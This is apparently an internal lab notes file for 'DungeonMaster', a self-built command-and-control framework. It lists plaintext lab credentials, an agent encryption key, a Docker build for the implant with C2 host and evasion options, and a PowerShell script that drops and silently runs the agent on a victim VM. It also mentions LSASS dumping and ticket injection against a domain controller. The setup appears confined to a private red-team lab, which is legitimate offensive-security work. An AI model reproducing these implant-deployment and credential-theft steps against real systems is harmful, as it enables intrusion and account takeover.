# DungeonMaster Lab — Credentials & Infrastructure

## DM C2 Stack

| Service | URL | Notes |
|---------|-----|-------|
| C2 listener | https://localhost:4443 | TLS, self-signed |
| API | http://localhost:8080 | REST, no TLS |
| UI | http://localhost:3000 | React dev server |

**API auth:** `admin / Mr.president2009`

---

## Hyper-V Lab VMs

| VM Name | Role | OS |
|---------|------|----|
| DM-TARGET01 | Victim workstation | Windows 10/11 |
| DM-DC01 | Domain controller | Windows Server |

**Virtual switch:** `vEthernet (DM-Lab)`
**Host IP on lab net:** `10.10.10.1`

### VM Credentials

| VM | Account | Password | Status |
|----|---------|----------|--------|
| DM-TARGET01 | `.\Administrator` or `TARGET01\Administrator` | `Mr.president2009` | ✅ Verified 2026-07-18 |
| DM-DC01 | `AMITLAB\Administrator` | `LabAdmin@DC2024!` | ✅ Verified 2026-07-19 (PS Direct confirmed) |

> **CRITICAL: On domain-joined machines, bare `Administrator` resolves to the domain account, not local.**
> Always use `.\Administrator` or `MACHINENAME\Administrator` for local account PS Direct.

**DC01 note:** DC01 has no local SAM — all accounts are domain (AMITLAB.local). Domain admin password: `LabAdmin@DC2024!` (from autounattend.xml, carried through DC promo).

**Domain:** `AMITLAB.local`
**DC hostname:** `DC01.AMITLAB.local`

---

## Registration Key (DM_REG_KEY)

AES-256-GCM pre-shared key baked into agents at build time. Server reads from `.env`.

```
DM_REG_KEY=83f2f0eef4d91ee6ef311ef4938a8bb461410c65e7868b1ec2c34237dd5900d1
```

All zeros = dev/plaintext mode (backward compat). Current key is active in `.env`.

---

## Agent Build (Docker)

```powershell
docker context use default

docker build -f infra/docker/Dockerfile.agent `
  --build-arg DM_C2_HOST=10.10.10.1 `
  --build-arg DM_C2_PORT=4443 `
  --build-arg DM_TLS_SKIP_VERIFY=true `
  --build-arg DM_SLEEP_SECS=5 `
  --build-arg DM_NO_EVASION=true `
  --build-arg DM_REG_KEY=83f2f0eef4d91ee6ef311ef4938a8bb461410c65e7868b1ec2c34237dd5900d1 `
  -t dm-agent:lab .

docker rm -f tmp-dm 2>$null
docker create --name tmp-dm dm-agent:lab
docker cp tmp-dm:/dm-agent.exe C:\dev\DM-clean\lab-builds\dm-batch7-final.exe
docker rm tmp-dm
```

**Default build args (wrong for lab):** DM_C2_HOST=127.0.0.1, DM_SLEEP_SECS=30 — always override.

**Current agent:** `C:\dev\DM-clean\lab-builds\dm-batch33.exe` — 942592 bytes, built 2026-07-25 (cred/opth cmd runs directly in current session after TGT injection — end-to-end `dir \\DC01.AMITLAB.LOCAL\C$` confirmed).

**C2 server body limit:** `server/internal/api/c2.go:175` — 256MB (was 32MB; LSASS dumps are ~105MB base64).

---

## PS Direct (deploy agent to VM without network)

```powershell
$cred = New-Object System.Management.Automation.PSCredential(
    ".\Administrator",   # .\prefix required on domain-joined VMs for local account
    (ConvertTo-SecureString "Mr.president2009" -AsPlainText -Force)
)

# Transfer binary via base64
$bytes = [IO.File]::ReadAllBytes("C:\tmp\dm-out\dm-agent.exe")
$b64 = [Convert]::ToBase64String($bytes)
Invoke-Command -VMName "DM-TARGET01" -Credential $cred -ScriptBlock {
    param($b64)
    [IO.File]::WriteAllBytes("C:\Windows\Temp\dm.exe", [Convert]::FromBase64String($b64))
    Start-Process "C:\Windows\Temp\dm.exe" -WindowStyle Hidden
} -ArgumentList $b64
```

---

## Quick Auth Token (API)

```powershell
$resp = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/auth/login" `
    -Method POST -ContentType "application/json" `
    -Body '{"username":"admin","password":"Mr.president2009"}'
$resp.access_token | Set-Content C:\tmp\dm_token.txt -NoNewline
```

Token expires — refresh at start of each session before queuing tasks.
